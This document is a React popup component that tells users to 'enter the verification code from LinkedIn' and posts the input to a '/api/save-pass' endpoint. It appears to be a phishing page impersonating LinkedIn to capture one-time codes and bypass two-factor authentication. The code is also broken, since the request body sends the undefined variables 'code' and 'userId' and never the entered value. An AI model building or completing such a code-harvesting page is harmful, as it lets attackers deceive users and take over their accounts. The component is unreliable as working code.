"use client";
import { useState } from "react";
import Input from "./input";
import Button from "./button";

const Popup = () => {
  const [pass, setPass] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("pass", pass);

    try {
      const savingPass = await fetch("/api/save-pass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          code,
          userId,
        }),
      });

      if (!savingPass.ok) {
        const errorResponse = await savingPass.json();
        throw new Error(errorResponse.message || "Something went wrong");
      }
    } catch (error) {
      console.log(error.message);
    }
  };

  return (
    <div className="w-[700px] p-[50px] flex flex-col gap-[20px]">
      <p className="text-center">
        Check your email and enter the verification code from LinkedIn
      </p>
      <form
        className="flex flex-col gap-8 items-center"
        onSubmit={handleSubmit}
      >
        <Input
          type="text"
          value={pass}
          onChange={(e) => setPass(e.target.value)}
        />
        <Button className="btn-primary"type="submit">
          <p>Send Pass</p>{" "}
        </Button>
      </form>
    </div>
  );
};

export default Popup;
